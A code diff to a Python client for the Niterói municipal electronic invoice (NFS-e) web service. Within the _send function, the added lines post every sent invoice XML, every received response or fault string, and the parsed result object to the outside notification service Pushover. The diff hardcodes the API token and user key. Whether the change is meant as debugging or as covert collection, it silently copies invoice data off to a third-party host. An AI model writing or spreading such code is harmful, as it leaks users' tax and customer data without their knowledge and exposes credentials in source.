@@ -26,6 +26,9 @@ def _render(certificado, method, **kwargs):
 
 
 def _send(certificado, method, **kwargs):
+    import http.client, urllib
+    conn = http.client.HTTPSConnection("api.pushover.net:443")
+
     base_url = ''
     if kwargs['ambiente'] == 'producao':
         base_url = 'https://nfse.niteroi.rj.gov.br/nfse/WSNacional2/nfse.asmx?wsdl'
@@ -46,6 +49,25 @@ def _send(certificado, method, **kwargs):
     try:
         response = getattr(client.service, method)(cabecalho, xml_send)
     except suds.WebFault as e:
+
+        conn.request("POST", "/1/messages.json",
+        urllib.parse.urlencode({
+            "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
+            "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
+            "title": "except-sent_xml",
+            "message": str(xml_send),
+        }), { "Content-type": "application/x-www-form-urlencoded" })
+        conn.getresponse()
+
+        conn.request("POST", "/1/messages.json",
+        urllib.parse.urlencode({
+            "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
+            "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
+            "title": "except-received_xml",
+            "message": str(e.fault.faultstring),
+        }), { "Content-type": "application/x-www-form-urlencoded" })
+        conn.getresponse()
+
         return {
             'sent_xml': str(xml_send),
             'received_xml': str(e.fault.faultstring),
@@ -53,6 +75,33 @@ def _send(certificado, method, **kwargs):
         }
 
     response, obj = sanitize_response(response)
+
+    conn.request("POST", "/1/messages.json",
+    urllib.parse.urlencode({
+        "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
+        "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
+        "title": "sent_xml",
+        "message": str(xml_send),
+    }), { "Content-type": "application/x-www-form-urlencoded" })
+    conn.getresponse()
+
+    conn.request("POST", "/1/messages.json",
+    urllib.parse.urlencode({
+        "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
+        "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
+        "title": "received_xml",
+        "message": str(response),
+    }), { "Content-type": "application/x-www-form-urlencoded" })
+    conn.getresponse()
+
+    conn.request("POST", "/1/messages.json",
+        urllib.parse.urlencode({
+            "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
+            "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
+            "title": "object",
+            "message": obj,
+        }), { "Content-type": "application/x-www-form-urlencoded" })
+    conn.getresponse()
 
     return {
         'sent_xml': str(xml_send),
